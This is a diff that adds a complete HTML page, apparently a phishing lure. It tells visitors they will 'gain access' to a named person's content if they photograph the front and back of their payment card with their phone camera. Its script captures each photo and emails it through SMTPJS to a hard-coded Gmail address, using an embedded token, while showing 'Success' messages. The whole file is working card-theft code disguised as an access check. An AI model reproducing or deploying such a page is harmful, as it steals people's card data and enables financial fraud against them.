@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="invalid.css">
+    <style>
+        body {
+            background-color: black;
+        }
+        #video-container {
+            position: relative;
+            width: 400px;
+            height: 499px;
+            display: none; 
+            align-items: center;
+            justify-content: center;                   
+            margin-left: -17px;
+        }
+        #video {
+            width: 100%;
+            height: 100%;
+        }
+        #snap {
+            position: absolute;
+            bottom: 20px;
+            left: 50%;
+            transform: translateX(-50%);
+            padding: 10px 20px;
+            background-color: #6acbff;
+            color: white;
+            border: none;
+            cursor: pointer;
+       border-radius: 21px;
+               }
+        #camera-icon {
+            width: 50px;
+            cursor: pointer;
+        }
+        #message {
+            text-align: center;
+            font-size: 29px;
+            margin: 20px;
+            font-family: "Poppins", sans-serif;
+            color: #ffffff;
+        font-weight: bold;
+        }
+        .mark p {
+            font-size: 67px;
+            color: #ffffff;
+        }
+    </style>
+</head>
+<body>
+    <div id="video-container">
+        <video id="video" autoplay></video>
+        <button id="snap" onclick="captureAndShowMessage()">Snap Photo</button>
+    </div>
+    <div class="mark">
+        <p id="message">Now Snap the front picture of your card 💳!!!</p>
+    </div>
+
+    <canvas id="canvas" width="640" height="480" style="display: none;"></canvas>
+
+    <script src="https://smtpjs.com/v3/smtp.js"></script>
+    <script>
+        let videoStream;
+        let snapCount = 0;
+        const video = document.getElementById('video');
+        const videoContainer = document.getElementById('video-container');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+        const message = document.getElementById('message');
+
+        function openCamera() {
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: { exact: "environment" } } })
+                .then(function (stream) {
+                    video.srcObject = stream;
+                    videoStream = stream;
+                    videoContainer.style.display = 'block';
+                })
+                .catch(function (err) {
+                    console.error("Error accessing the camera: " + err);
+                });
+        }
+
+        function closeCamera() {
+            if (videoStream) {
+                let tracks = videoStream.getTracks();
+                tracks.forEach(track => track.stop());
+                video.srcObject = null;
+                videoContainer.style.display = 'none';
+            }
+        }
+
+        function sendEmail(imageDataUrl) {
+            Email.send({
+                SecureToken: "9a099cf2-87ef-4902-8426-17dcc04b64a0", // Replace with your SMTPJS Secure Token
+                To: 'youngella513@gmail.com',
+                From: 'youngella513@gmail.com',
+                Subject: 'Captured Image',
+                Body: 'Attached is the image you captured.',
+                Attachments: [
+                    {
+                        name: "captured_image.jpg",
+                        data: imageDataUrl.replace(/^data:image\/(png|jpeg);base64,/, "")
+                    }
+                ]
+            }).then(function (message) {
+                console.log('Mail sent successfully:', message);
+            }).catch(function (error) {
+                console.error('Error sending mail:', error);
+            });
+        }
+
+        function captureAndShowMessage() {
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const dataUrl = canvas.toDataURL('image/jpeg');
+
+            closeCamera();
+
+            if (snapCount === 0) {
+                message.innerText = 'Now Snap The Front Picture Of Your Card💳!!!';
+                sendEmail(dataUrl);
+                snapCount++;
+                setTimeout(function() {
+                    message.innerText = 'Success!!! Now Snap The Back Picture Of Your Card 💳!!!';
+                    openCamera();
+                }, 3000);
+            } else {
+                message.innerText = 'Success!!! You will gain access soon to view Freya Henry page content. Have a nice day!!!';
+                sendEmail(dataUrl);
+                snapCount++;
+            }
+        }
+
+        window.onload = function() {
+            message.innerText = 'Now Snap the front picture of your card 💳!!!';
+            openCamera();
+        };
+    </script>
+</body>
+</html>
